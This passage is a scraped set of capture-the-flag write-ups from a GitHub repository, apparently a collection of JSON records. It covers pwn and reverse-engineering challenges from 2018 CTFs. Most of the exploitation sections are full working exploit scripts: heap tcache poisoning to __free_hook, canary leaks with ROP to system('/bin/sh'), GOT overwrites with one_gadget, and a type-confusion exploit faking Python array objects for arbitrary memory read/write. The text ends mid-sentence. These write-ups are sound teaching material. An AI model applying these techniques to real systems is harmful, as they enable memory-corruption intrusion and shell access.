#tcache\ndele(1)\ndele(7)\n#all: 0x561abcfa3ae0 -> 0x7fea7da40ca0 (main_arena+96) -> 0x561abcf9f8b0 <- 0x561abcfa3ae0\n#overlap unsorted bin\n# 1 3-7 9\n\nfor i in xrange(0,5):\n\tadd(0x2000, \"/bin/sh\\x00\")\nadd(0x1A70, \"remove all b from bins, now there is only bc chunk\")\n\nadd(0x500, \"should leak\") #9\nlibc_addr = u64(show(2) + \"\\x00\\x00\") - UNSORTED_OFF\nprint hex(libc_addr)\ndele(9)\ndele(8) #free padding since we've already leaked, this frees some index\nadd(0x1D10, \"reach tcache\") #8\nadd(0x10, p64(libc_addr + e.symbols[\"__free_hook\"]))\ndele(8)\nadd(0x200, \"hopefully works\")\ndele(4) #index reallllllly not sufficient!!!!!\nadd(0x200, p64(libc_addr + 0x4f322)) #0x40 one_gadget\n\nsh.send(\"3\\x00\")\nsh.recvuntil(\"Index:\")\nsh.send(str(5) + \"\\x00\")\n\nsh.interactive()\n```\n\n", "timestamp": "2025-10-24T11:39:13.393198"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-10-26-P-W-N-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-10-26-P-W-N-CTF/README.md", "content": "## Exploitation Class\n\nThe program allocates a `char data[22][12];`  buffer on the stack, and we can read and write it.\n\nThe vulnerability is here\n\n```c\nunsigned __int64 __fastcall writeData(char *a1)\n{\n  unsigned int v2; // [rsp+4h] [rbp-14h]\n  unsigned __int64 v3; // [rsp+8h] [rbp-10h]\n\n  v3 = __readfsqword(0x28u);\n  puts(\"Which entry to write?\");\n  v2 = 0;\n  __isoc99_scanf(\"%u\", &v2);\n  if ( v2 <= 0xFC )\n  {\n    puts(\"What to write?\");\n    read(0, &a1[12 * v2], 0xCuLL);\n  }\n  return __readfsqword(0x28u) ^ v3;\n}\n```\n\nIt ensures that index is `<= 0xfc`, however, it should be `idx * 12 <= 0xfc`, so this leads to a index out of bound.\n\nAlso, there is no null termination here, so we can leak some data.\n\nThere is stack canary here, so we need to leak the canary and libc address. Because we can read the last element of the array, we can fill all of the bytes such that there is no null termination from the last element to the data we want to leak. Then we can leak the data by showing the last element.\n\nAfter leaking the data, it is very easy to ROP and execute the `system(\"/bin/sh\")`\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\n\nif g_local:\n\tsh = process(\"./exploitClass\")#env={'LD_PRELOAD':'./libc.so.6'}\n\tMAIN_RET_OFF = 0x20830\n\tONE_GADGET = 0x45216\n\tPOP_RDI = 0\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"class.uni.hctf.fun\", 24241)\n\t#sh = process(\"./exploitClass\", env={'LD_PRELOAD':'./libc.so.6'})\n\tMAIN_RET_OFF = 0x24223\n\tONE_GADGET = 0x451F9 #0x45254\n\tPOP_RDI = 0x23BE3\n\te = ELF(\"./libc.so.6\")\n\n\ndef read(idx):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Which entry to show?\\n\")\n\tsh.send(str(idx) + \"\\n\")\n\tret = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"Enter 1 to read, 2 to write and any other number to exit!\\n\")\n\treturn ret[:-1]\n\ndef write(idx, data):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Which entry to write?\\n\")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"What to write?\\n\")\n\tsh.send(data)\n\tsh.recvuntil(\"Enter 1 to read, 2 to write and any other number to exit!\\n\")\n\nsh.recvuntil(\"Enter 1 to read, 2 to write and any other number to exit!\\n\")\nwrite(21, \"B\" * 12)\nwrite(22, \"C\")\n#write(24, \"A\" * 8 + '\\xa0') #return to main\ncanary = u64(read(21)[0xc:0xc+8]) - ord('C')\nprint hex(canary)\nfor i in xrange(0,4):\n\twrite(22 + i, \"B\" * 0xc)\nlibc_addr = u64(read(21)[0x3c:0x3c+6] + \"\\x00\\x00\") - MAIN_RET_OFF\n\nwrite(22, p64(canary))\nwrite(24, 'A' * 8 + p32((libc_addr + POP_RDI) & 0xffffffff))\nwrite(25, p32((libc_addr + POP_RDI) >> 0x20) + p64(libc_addr + next(e.search(\"/bin/sh\"))))\nwrite(26, p64(libc_addr + e.symbols[\"system\"]))\nprint hex(libc_addr)\nwrite(29, '\\x00' * 0xc)\nsh.send(\"3\\n\")\nsh.interactive()\n```\n\n## Important Service\n\n0x401 0 can cause the buffer overflow, which can overwrite one lowest byte of the function pointer in the stack\n\n```c\nchar vulnbuf[1024]; // [rsp+0h] [rbp-420h]\nint (__fastcall *func_addr)(char *, int, int); // [rsp+400h] [rbp-20h]\n//...\nfread(vulnbuf, 1uLL, (signed int)vullen, stdin);\nfunc_addr(vulnbuf, vullen, v7);\n```\n\nAlthough there is PIE in this program, the lowest 12 bits will not change due to the PIE. Initially the function pointer in the stack is `base_addr + 0x11BC`, and the shell function address is `base_addr + 0x11A9`, so if we change `0xbc` to `0xa9`, the shell function will be called instead.\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\nstore_idx = 0\n\nif g_local:\n\tsh = process(\"./importantservice\")#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"importantservice.uni.hctf.fun\", 13375)\n\nsh.recvuntil(\"Please enter width and height e.g.: 5 8\\n\")\nsh.send(str(0x401) + \" 0\\n\")\nsh.recvuntil(\"Please provide some data e.g.: 12345\\n\")\nsh.send(\"A\" * 0x400 + \"\\xa9\")\n\nsh.interactive()\n```\n\n## Kindergarten PWN\n\nIn the program, an index is required to be given, and the program will show the original byte at that index and let you to change it. The problem is that it did not check the index must be `>=0`\n\n```c\nif ( v5 <= 31 )//v5 < 0\n{\n   printf(\"the value at %d is %hhd. give me a new value:\\n> \", (unsigned int)v5, (unsigned int)array[v5]);\n   v3 = &v4;\n   if ( (unsigned int)__isoc99_scanf(\"%hhd\", &v4) != 1 )\n     break;\n   array[v5] = v4;\n}\n```\n\nand array is a global variable, and the got table can be overwritten, so we can use this to leak the libc address and rewrite the got table to `one_gadget`\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\nstore_idx = 0\n\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\nif g_local:\n\tsh = process(\"./kindergarten\")#env={'LD_PRELOAD':'./libc.so.6'}\n\t#sh = process(['ld.so.2', './user.elf'])\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"kindergarten.uni.hctf.fun\", 13373)\n\t#ONE_GADGET_OFF = 0x4557a\n\ndef one_iter(idx, val = None):\n\tsh.recvuntil(\"give me an index:\\n> \")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"the value at \" + str(idx)+ \" is \")\n\tret = sh.recvuntil(\".\")\n\tsh.recvuntil(\" give me a new value:\\n> \")\n\tret = int(ret[:len(ret)-1])\n\tif val:\n\t\tsh.sendline(str(val))\n\telse:\n\t\tsh.sendline(str(ret))\n\treturn ret & 0xff\n\ndef leak_qword(off):\n\tret = 0\n\tfor i in xrange(0,8):\n\t\tret |= one_iter(off + i) << (8 * i)\n\treturn ret\n\ndef shoot_qword(off, val):\n\tfor i in xrange(0,8):\n\t\tone_iter(off + i, (val >> (8 * i)) & 0xff)\n\nlibc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]\n#leak address of `printf`\nprint hex(libc_addr)\nshoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a) #0x30 one_gadget\n#rewirte the `exit` function to one_gadget\nsh.recvuntil(\"> \")\nsh.sendline(\"asd\")\n\nsh.interactive()\n```\n\n", "timestamp": "2025-10-24T11:39:13.885801"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-12-27-35C3-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-12-27-35C3-CTF/README.md", "content": "# 2018-12-27-35C3-CTF #\n\n[CTFTime link](https://ctftime.org/event/718) | [Website](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/)\n\n---\n\n## Challenges ##\n\nNote: only listing solved challenges.\n\n### pwn ###\n\n - [x] [150 collection](#150-pwn--collection)\n\n### rev ###\n\n - [x] [49 0pack](#49-rev--0pack)\n - [x] [72 box of blink](#72-rev--box-of-blink)\n - [x] [65 corebot](#65-rev--corebot)\n - [x] [97 juggle](#97-rev--juggle)\n - [x] [215 notifico](#215-rev--notifico)\n \n---\n\n## 150 pwn / Collection ##\n\n**Description**\n\n> [behold my collection](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/52ae03f0ae030a74a2bd466852308cba74c0f313.tar.gz)\n> \n> The container is built with the following important statements\n> \n> FROM ubuntu:18.04\n> \n> ```\n> RUN apt-get -y install python3.6\n> COPY build/lib.linux-x86_64-3.6/Collection.cpython-36m-x86_64-linux-gnu.so /usr/local/lib/python3.6/dist-packages/Collection.cpython-36m-x86_64-linux-gnu.so\n> ```\n> \n> Copy the library in the same destination path and check that it works with\n> \n> ```bash\n> python3.6 test.py\n> ```\n> \n> Challenge runs at 35.207.157.79:4444\n> \n> Difficulty: easy\n\n**Files provided**\n\n - [collection](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/52ae03f0ae030a74a2bd466852308cba74c0f313.tar.gz)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThis should be an easy challenge, but I have missed some basic Python knowledge essential to solving the chanllenge, so I failed to solve it in the contest. :(\n\nAnyway let's start looking at it. The `Python3.6` and `libc` given are exactly same as the ones in `Ubuntu 18.04`, so they are not important. According to the instruction and the files given, we can find that a new data type `Collection` implemented in `Collection.cpython-36m-x86_64-linux-gnu.so` is given. Anything that can help to get the flag directly in Python is disabled, and it is obvious that we need to exploit the given `Collection` data type to get the flag.\n\nBut how does the extended data type works? For example, there should be some convention that helps the CPython to know how to correspond Python function with particular native C function, just like Android native function. After some investigation and Google, I found this [documentation](https://docs.python.org/3/extending/), and I will not detail the software development part here because they are well explained in the link I provides.\n\n### reverse engineering\n\nAfter understanding the basic concept above, we can start looking at the `.so` binary.\n\n```c\n__int64 PyInit_Collection()\n{\n  __int64 v0; // rax\n  __int64 ret; // rbx\n\n  if ( (signed int)PyType_Ready((__int64)type_Collection) < 0 )\n    return 0LL;\n  v0 = PyModule_Create2((__int64)def_module, 1013LL); // create the module\n  ret = v0;\n  if ( !v0 )\n    return ret;\n  ++type_Collection[0];\n  PyModule_AddObject(v0, (__int64)\"Collection\", (__int64)type_Collection);\n  // add the type into module\n  // These codes are basically same as the demo in official doc\n  mprotect((void *)0x439000, 1uLL, 7);\n  MEMORY[0x43968F] = _mm_load_si128((const __m128i *)&16_0xcc);\n  MEMORY[0x43969F] = MEMORY[0x43968F];          // write int3 into python3.6???\n  mprotect((void *)0x439000, 1uLL, 5);\n  init_sandbox(); // disable most syscall, we can only read the flag by `readv` and `write`\n  return ret;\n}\n```\n\nThen we need to look at `type_Collection` to find the member functions of data type `Collection`. I initially decide to import the `PyTypeObject` from `Python.h`, but the dependency problem is a bit annoying. If anyone knows a good way to import the data structures from header files like this, please let me know. :)\n\nAnother way is just to look at the memory layout and guess. After some investigation, it is obvious that `0x1470` correspond to the `get` member function that should be essential, according to memory layout.\n\n![1546245330387](1546245330387.png)\n\nIn addition, `0x1700` is the `__init__` and `0x1550` is the `__new__`, because `0x1700` seems to assign some initial value to the struct while `0x1550` only create and return a object. To ensure our assumption, we can set the breakpoint and we can find that indeed `0x1550` will be called first when creating a `Collection` object. \n\nThe way to debug this thing is also tricky. The `.so` of `Collection` will not be loaded until `import Collection` is executed. However, when we run `python3` interactively, the `read` syscall will be called after we import the module, which will cause the bad syscall due to the sandbox. To make the debug more convinient, we can patch the library and remove the sandbox first.\n\n### analyze critical functions\n\nIt is quite inconvinient that we cannot import the structrue to help analysis, so we cannot use `y` to let the code more readable.\n\n```c\n_QWORD *__fastcall _new__(__int64 type_Collection, __int64 a2)\n{\n  __int64 len; // rax\n  _QWORD *result; // rax\n  __int64 arg_dict; // [rsp+0h] [rbp-18h]\n  unsigned __int64 v5; // [rsp+8h] [rbp-10h]\n\n  v5 = __readfsqword(0x28u);\n  if ( PyArg_ParseTuple(a2, \"O!\", &PyDict_Type, &arg_dict) )\n  {\n    len = PyDict_Size(arg_dict, (__int64)\"O!\");\n    if ( len && len <= 32 )                     // off by one, but not very exploitable\n    {\n      result = (_QWORD *)(*(__int64 (__fastcall **)(__int64, _QWORD))(type_Collection + 0x130))(type_Collection, 0LL);// type->tp_alloc(type, 0)\n      if ( result )\n        result[2] = 0LL;\n    }\n    else\n    {\n      result = &Py_NoneStruct;\n    }\n  }\n  else\n  {\n    PyErr_SetString(PyExc_TypeError, \"parameter must be a dictionary\");\n    result = 0LL;\n  }\n  return result;\n}\n```\n\n`PyArg_ParseTuple` is an interesting function, it separates the tuple `PyObject` into elements specified by format, and return `NULL` if the format is inconsistent with the real type. The detial is in official document. The `PyObject` is the `C` representation of Python object in C. The first field is reference count, and the second field is a pointer pointing to its `PyTypeObject` struct that specifies its type. The following data vary with different types of object. For example, for the Python big integer type, there will be an array storing the value of the big integer. The total length of the `PyObject` can also vary.\n\nThen we are going to look at `__init__` and `get` to see the memory layout of `PyObject` of `Collection`\n\n```c\n// the return value of __new__ is a1\nunsigned int __fastcall _init__(__int64 collection_obj, __int64 a2)\n{\n  __int64 v2; // r14\n  __int64 dict_; // rbx\n  int i; // er12\n  __int64 keys; // r13\n  list *lRecord; // r15\n  char *strKey; // rax\n  int type; // esi\n  __int64 v9; // rdx\n  record *v10; // rax\n  handler *v11; // rax\n  unsigned int result; // eax\n  __int64 v13; // rdi\n  __int64 v14; // rax\n  char *v15; // ST08_8\n  __int64 dict; // [rsp+18h] [rbp-60h]\n  __int64 poKey; // [rsp+20h] [rbp-58h]\n  _QWORD *poVal; // [rsp+28h] [rbp-50h]\n  __int64 ppos; // [rsp+30h] [rbp-48h]\n  unsigned __int64 v20; // [rsp+38h] [rbp-40h]\n\n  v2 = collection_obj;\n  v20 = __readfsqword(0x28u);\n  if ( PyArg_ParseTuple(a2, \"O!\", &PyDict_Type, &dict) )\n  {\n    dict_ = dict;\n    if ( *(_BYTE *)(*(_QWORD *)(dict + 8) + 171LL) & 0x20 )\n    {\n      i = 0;\n      keys = PyDict_Keys(dict);\n      if ( *(_BYTE *)(*(_QWORD *)(keys + 8) + 171LL) & 2 )\n      {\n        while ( i < PyList_Size(keys) )\n        {\n          if ( !(*(_BYTE *)(*(_QWORD *)(PyList_GetItem(keys, i) + 8) + 171LL) & 0x10) )\n          {\n            PyErr_SetString(PyExc_TypeError, \"parameter must be a string\");\n              // check all keys are string\n            goto LABEL_20;\n          }\n          ++i;\n        }\n        lRecord = listCreate();\n        ppos = 0LL;\n        while ( PyDict_Next(dict_, &ppos, &poKey, &poVal) )\n        {\n          strKey = PyUnicode_AsUTF8(poKey);\n          type = 0;\n          v9 = *(_QWORD *)(poVal[1] + 168LL);\n          if ( !(v9 & 0x2000000) )\n          {\n            type = 2;\n            if ( !(v9 & 0x20000000) )\n            {\n              type = 1;\n              if ( !(v9 & 0x1000000) )\n              {\n                v15 = strKey;\n                PyErr_SetString(PyExc_TypeError, \"properties can only be either list, dictionary or an integer\");\n                type = -1;\n                strKey = v15;\n              }\n            }\n          }\n          v10 = newRecord(strKey, type);\n          listAppend(lRecord, v10);\n        }\n        v11 = getTypeHandler(lRecord);\n        ppos = 0LL;\n        *(_QWORD *)(collection_obj + 16) = v11;\n        while ( 1 )\n        {\n          result = PyDict_Next(dict_, &ppos, &poKey, &poVal);\n          if ( !result )\n            break;\n          v13 = poKey;\n          ++*poVal;\n          PyUnicode_AsUTF8(v13);\n          if ( *(_BYTE *)(poVal[1] + 171LL) & 1 )\n          {\n            v14 = PyLong_AsLong(poVal);\n            *(_QWORD *)(v2 + 8 * ppos + 16) = v14;\n          }\n          else\n          {\n            *(_QWORD *)(v2 + 8 * ppos + 16) = poVal;// ppos start from 1\n          }\n        }\n      }\n      else\n      {\n        PyErr_SetString(PyExc_TypeError, \"parameter must be a list\");\nLABEL_20:\n        PyErr_SetString(PyExc_TypeError, \"parameter must be a list\");\n        result = -1;\n      }\n    }\n    else\n    {\n      PyErr_SetString(PyExc_TypeError, \"parameter must be a list\");\n      result = -1;\n    }\n  }\n  else\n  {\n    PyErr_SetString(PyExc_TypeError, \"parameter must be a dictionary\");\n    result = 0;\n  }\n  return result;\n}\nvoid *__fastcall py_get(CollectionObj *a1, __int64 a2)\n{\n  __int64 *v2; // rcx\n  CollectionObj *v3; // rbx\n  __int64 *v4; // rdi\n  int idx; // eax\n  node *iter; // rdx\n  int v7; // ecx\n  void *result; // rax\n  __int64 arg; // [rsp+0h] [rbp-18h]\n  unsigned __int64 v10; // [rsp+8h] [rbp-10h]\n\n  v3 = a1;\n  v10 = __readfsqword(0x28u);\n  if ( !PyArg_ParseTuple(a2, \"s\", &arg, v2) )\n    return &Py_NoneStruct;\n  v4 = (__int64 *)a1->type;\n  if ( v4 != type_Collection && !(unsigned int)PyType_IsSubtype(v4, type_Collection) )\n    return &Py_NoneStruct;\n  idx = listIndexOf(v3->u[0].handler->lRecord, arg, (unsigned int (__fastcall *)(_QWORD, __int64))recordNameComparator);\n  if ( idx == -1 )\n    return &Py_NoneStruct;\n  iter = v3->u[0].handler->lRecord->head;\n  if ( iter && idx > 0 )\n  {\n    v7 = 0;\n    do\n    {\n      iter = iter->next;\n      ++v7;\n    }\n    while ( iter && idx > v7 );\n  }\n  result = (void *)v3->u[idx + 1].val;\n  if ( iter->record->val_type == 1 )\n    result = (void *)PyLong_FromLong(result);\n  return result;\n}\n```\n\nrelavant data structures\n\n```assembly\n00000000 list            struc ; (sizeof=0x14, align=0x4, copyof_14)\n00000000 head            dq ?\n00000008 tail            dq ?                    ; offset\n00000010 len             dd ?\n00000014 list            ends\n00000014\n00000000 ; ---------------------------------------------------------------------------\n00000000\n00000000 record          struc ; (sizeof=0xC, align=0x4, mappedto_15)\n00000000 key_str         dq ?\n00000008 val_type        dd ?\n0000000C record          ends\n0000000C\n00000000 ; ---------------------------------------------------------------------------\n00000000\n00000000 handler         struc ; (sizeof=0xC, align=0x4, mappedto_17)\n00000000 lRecord         dq ?\n00000008 count           dd ?\n0000000C handler         ends\n0000000C\n00000000 ; ---------------------------------------------------------------------------\n00000000\n00000000 node            struc ; (sizeof=0x10, align=0x8, copyof_16)\n00000000 record          dq ?\n00000008 next            dq ?\n00000010 node            ends\n00000010\n00000000 ; ---------------------------------------------------------------------------\n00000000\n00000000 union_7         union ; (sizeof=0x8, mappedto_19)\n00000000 handler         dq ?                    ; offset\n00000000 val             dq ?\n00000000 obj             dq ?\n00000000 union_7         ends\n00000000\n00000000 ; ---------------------------------------------------------------------------\n00000000\n00000000 CollectionObj   struc ; (sizeof=0x118, mappedto_20)\n00000000 ref_count       dq ?\n00000008 type            dq ?\n00000010 u               union_7 33 dup(?)\n00000118 CollectionObj   ends\n```\n\n`record` stores the key which is a string, and the type of value correspond to that key; and the `handler` stores a list of records, which is the type information of a specific dictionary. In the `CollectionObj`, which is the `PyObject` of `Collection`, we have a pointer to the `handler`, and we also have the array that stores the `PyObject` of values in dictionary, except for the integer type we just store it as long type in C. The order in handler linked list and the order in array in `CollectionObj` should have been matched exactly to each other. However, when `getTypeHandler` is called, it will return a previous handler if the handler already exists, **even if the order of entries in the dictionary is different**.\n\nHere is where the vulnerability comes, type confusion. The PoC that cause the crash is simple:\n\n```python\nia = Collection.Collection({\"int\": 0x1337, \"arr\": [0xdead, 0xbeef]})\nai = Collection.Collection({\"arr\": [0xdead, 0xbeef], \"int\": 0x1337}) \n#they will share the same handler, even if the order is different\n#and the order of the array in `CollectionObj` is also different\nprint(ia.get(\"int\"))\nprint(ia.get(\"arr\"))\nprint(ai.get(\"int\")) #print address\nprint(ai.get(\"arr\")) #cause crash because it regards 0x1337 as address\n```\n\n### exploitation\n\nBecause I can leak the object address using `id(obj)`, so we can fake a object easily in the memory and return an address pointing to it in the `Collection.get`. If we can find a structure that internally keep a pointer pointing to a C array, and we can read and write its element, we will have arbitrary address read and write. This is where I failed. The Python string is not the case because it stores the data directly in the `PyObject`, and we cannot edit it. The Python list is neither the case because the pointer points to an array of pointers pointing to Python objects. When we assign new value to the list, what is changed is the pointer to the Python object, instead of the content inside the object, so we cannot exploit this. Then I come to some other approach such as Python heap exploitation, but they don't work very well, or the difficulty to exploit in that way is far beyond my capability. After the CTF, I read some of the write-ups and found `array.array` that performs exactly same as what I expected.\n\nThen the thing become very easy. We can leak the `libc` and stack address very easily, and write to stack to perform ROP that gets the flag.\n\n```python\nimport os\nflag = open(\"flag\", \"r\")\nos.dup2(flag.fileno(), 1023)\nflag.close()\n\nfrom sys import modules\ndel modules['os']\nimport Collection\nkeys = list(__builtins__.__dict__.keys())\nfor k in keys:\n\tif k != 'id' and k != 'hex' and k != 'print' and k != 'range':\n\t\tdel __builtins__.__dict__[k]\n\n# ----------------start---------------------\n\np64 = lambda x: x.to_bytes(8,\"little\")\n\ndef create_rop(iov, buf):\n    #ROP is easy, I won't detail this\n\tPOPRAX = p64(0x0000000000420f7b)\n\tPOPRDI = p64(0x0000000000421612)\n\tPOPRSI = p64(0x000000000042110e)\n\tPOPRDX = p64(0x00000000004026c1)\n\tREADV = p64(0x4208B0)\n\tWRITE = p64(0x4207E0)\n\trop = b''\n\trop += POPRDI\n\trop += p64(1023)\n\trop += POPRSI\n\trop += p64(iov)\n\trop += POPRDX\n\trop += p64(1)\n\trop += READV #readv(1023, iov, 1)\n\trop += POPRDI\n\trop += p64(1)\n\trop += POPRSI\n\trop += p64(buf)\n\trop += POPRDX\n\trop += p64(0x100)\n\trop += WRITE #write(1, buf, 0x100)\n\trop += p64(0x2019)\n\treturn rop\n\ndef fake_array(addr):\n    # https://github.com/python/cpython/blob/master/Modules/arraymodule.c\n    # the first field is reference count, we make it big to avoid GC to collect it\n    # the 0x9d3340 and 0x715508 represent the type of PyObject and type of C array respectively\n    # in this case, I have chosen the unsigned char array to make it easy\n    # they are obtained from debugging\n    # the 3rd and 5th fields are both length, \n    # I don't know why there are 2 fields storing the same thing,\n    # although they can be inequal sometimes,\n    # so I just copied everything from the memory\n\treturn p64(0x0000000000002019) + p64(0x00000000009d3340) \\\n\t\t+ p64(0x0000000000002019) + p64(addr) \\\n\t\t+ p64(0x0000000000002019) + p64(0x0000000000715508) \\\n\t\t+ p64(0x0000000000000000) + p64(0x0000000000000000)\n\nia = Collection.Collection({\"int\":0x5cee56c130df7336, \"arr\":[0x2019, 0xbeef]})\n\nENVIRON = 0xa4f980\nleak = fake_array(ENVIRON)\n#suprisingly the environ is in Python module instead of libc module \nleak_addr = id(leak) + 0x20\n#for the string, the data is +0x20 after the PyObject address\n#but in the interactive mode, it seems to be +0x48?\n\nprint(hex(leak_addr))\n\nai_leak2 = Collection.Collection({\"arr\":[0x2019, 0xbeef], \"int\":leak_addr})\nleak_arr2 = ai_leak2.get(\"arr\") \n#This triggers the vulnerability, and returns an faked array.array object\n#also, make sure don't reassign this variable, otherwise the GC might be triggered\n\nprint(hex(id(leak_arr2)))\nassert id(leak_arr2) == leak_addr\n\nstack_addr = 0\nfor i in range(0,8):\n\tstack_addr |= (leak_arr2[i]) << (8 * i)\n#leak the stack address\n\n#here we decide to write the ROP into the return address of Py_Main\n#which should return to function main, and will be executed when the Python script terminates\n#This is good because it will not interfere essential data at the top of the stack,\n#and we are sure it will be executed as long as the program terminates\nstack_addr -= 0x148 # will point to return address of Py_Main\n\nprint(hex(stack_addr))\n#-------------------leak address to shoot rop\n\nwrite = fake_array(stack_addr)\nwrite_addr = id(write) + 0x20\nbuf_addr = 0xA4FF00 # choose a buffer that will not be used\nfake_iov = p64(buf_addr) + p64(0x100)\niov_addr = id(fake_iov) + 0x20\n#fake the iov for readv\n\nai_write = Collection.Collection({\"arr\":[0x2019, 0xbeef], \"int\":write_addr})\nwrite_arr = ai_write.get(\"arr\")\nprint(hex(id(write_arr)))\n#basically same as above\n\nrop = create_rop(iov_addr, buf_addr)\n\nfor i in range(15 * 8):\n\twrite_arr[i] = rop[i]\n#-----------------------write ROP\n```\n\n## 49 rev / 0pack ##\n\n**Description**\n\n> Build with my new packer framework. Do you likes zeros in weird places? Try [this](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/0pack-e58db1f74c3da8d9f89d7d381308aeaf1a615848.tar.gz)!\n> \n> (Password does not contain 35C3_, prepend before submitting flag `35C3_${extracted_password}`) Guest challenge by Qubasa.\n> \nDifficulty estimate: medium\n\n**Files provided**\n\n - [0pack](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/0pack-e58db1f74c3da8d9f89d7d381308aeaf1a615848.tar.gz)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nTo solve this challenge, we need to unpack the binary first. After some inspection, we can dump the binary using gdb `dump binary memory code.bin 0x555555554628 0x555555567094`, because this is the region where the writable codes lie.\n\nThen put it into the executable.\n\n```python\np = open(\"code.bin\", \"r\")\nd = p.read()\np.close()\n\nf = open(\"0pack.elf\", \"r+\")\nf.seek(0x628)\nf.write(d)\nf.close()\n```\n\nUsing `backtrace` command in gdb, we can find the function that calls the function to get input, here it is `fgets`\n\n```c\n__int64 __usercall sub_5555555669A0@<rax>(__int64 a1@<rsi>, _BYTE *a2@<r15>)\n{\n  char need1; // [rsp+1Dh] [rbp-83h]\n  char s[15]; // [rsp+20h] [rbp-80h]\n  char v5[16]; // [rsp+30h] [rbp-70h]\n  char out[58]; // [rsp+50h] [rbp-50h]\n  unsigned __int64 v7; // [rsp+98h] [rbp-8h]\n\n  v7 = __readfsqword(0x28u);\n  need1 = 1;\n  strcpy(v5, \"Input password: \");\n  printf(\"%s\", v5, a1);\n  fgets(s, 15, stdin);\n  putchar(10);\n  if ( s[0] != a2[74869] || antidbg() ) //clear plain text comparison\n    need1 = 0;\n  if ( s[1] != a2[74968] || antidbg() )\n    need1 = 0;\n  if ( s[2] != a2[74298] || antidbg() )\n    need1 = 0;\n  if ( s[3] != a2[74319] || antidbg() )\n    need1 = 0;\n  if ( s[4] != a2[74868] || antidbg() )\n    need1 = 0;\n  if ( s[5] != a2[74319] || antidbg() )\n    need1 = 0;\n  if ( s[6] != a2[74664] || antidbg() )\n    need1 = 0;\n  if ( s[7] != a2[74869] || antidbg() )\n    need1 = 0;\n  if ( s[8] != a2[74874] || antidbg() )\n    need1 = 0;\n  if ( s[9] != a2[74298] || antidbg() )\n    need1 = 0;\n  if ( s[10] != a2[74309] || antidbg() )\n    need1 = 0;\n  if ( s[11] != a2[74954] || antidbg() )\n    need1 = 0;\n  if ( s[12] != a2[74792] || antidbg() )\n    need1 = 0;\n  if ( s[13] != a2[74968] || antidbg() )\n    need1 = 0;\n  if ( need1 )\n  {\n    *(_QWORD *)out = '��_��� (';\n    *(_QWORD *)&out[8] = '��� (\\n)�';\n    *(_QWORD *)&out[16] = '��>)���_';\n    *(_QWORD *)&out[24] = '���-����';\n    *(_QWORD *)&out[32] = '��␌�(\\n';\n    *(_QWORD *)&out[40] = 'uf )���_';\n    *(_QWORD *)&out[48] = '!haey kc';\n    *(_WORD *)&out[56] = '\\n';\n  }\n  else\n  {\n    *(_QWORD *)out = '�� wwwwA';\n    *(_DWORD *)&out[8] = '��_�';\n    *(_WORD *)&out[12] = '\\n�';\n    out[14] = 0;\n  }\n  printf(\"%s\", out);\n  return 0LL;\n}\n```\n\nBy debugging, we can find that `a2 == 0x555555554000`, so get the flag using IDA script\n\n```python\ns = [None] * 14\ns[0] = chr(Byte(0x555555554000 + 74869))\ns[1] = chr(Byte(0x555555554000 + 74968))\ns[2] = chr(Byte(0x555555554000 + 74298))\ns[3] = chr(Byte(0x555555554000 + 74319))\ns[4] = chr(Byte(0x555555554000 + 74868))\ns[5] = chr(Byte(0x555555554000 + 74319))\ns[6] = chr(Byte(0x555555554000 + 74664))\ns[7] = chr(Byte(0x555555554000 + 74869))\ns[8] = chr(Byte(0x555555554000 + 74874))\ns[9] = chr(Byte(0x555555554000 + 74298))\ns[10] = chr(Byte(0x555555554000 + 74309))\ns[11] = chr(Byte(0x555555554000 + 74954))\ns[12] = chr(Byte(0x555555554000 + 74792))\ns[13] = chr(Byte(0x555555554000 + 74968))\n\nprint ''.join(s)\n```\n\nBut one thing that I don't understand is the way the packer works. The entry point is `0` for this executable, and so the initial rip should be `0x555555554000` with ASLR disabled. However, the data there in IDA pro and gdb are `0xe9 0xfb 0x5f 0x41 0x00`, which is `jmp 0x55555596a000`. The instructions in `0x55555596a000` make sense, because they seem to be the entry point of a packer. However, I don't know where `0xe9 0xfb 0x5f 0x41 0x00` comes from, because that address should be magic number of ELF header, `\"\\x7fELF\"`, and indeed in the ELF file it is so. And I cannot find `0xe9 0xfb 0x5f 0x41 0x00` in binary ELF file. Well, so I am not sure how these bytes are changed.\n\n## 72 rev / box of blink ##\n\n**Description**\n\n> As every year, can you please decode [this](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/blink.csv.gz) for me?\n> \n> ![](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/blink.jpg)\n\n**Files provided**\n\n - [blink.csv.gz](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/blink.csv.gz)\n\n**Solution**\n\nThe image shows a prototyping setup with:\n\n - a LED board (bottom right)\n - an oscilloscope (top) showing some squarewaves / digital data capture\n - a logic analyser (centre)\n - a Raspberry Pi (bottom left)\n\nIt is clear that the Pi has a program running that presumably displays the flag on the LED board at some point, and that the logic analyser captured this operation as the file we were given. The oscilloscope might give some additional hints for what 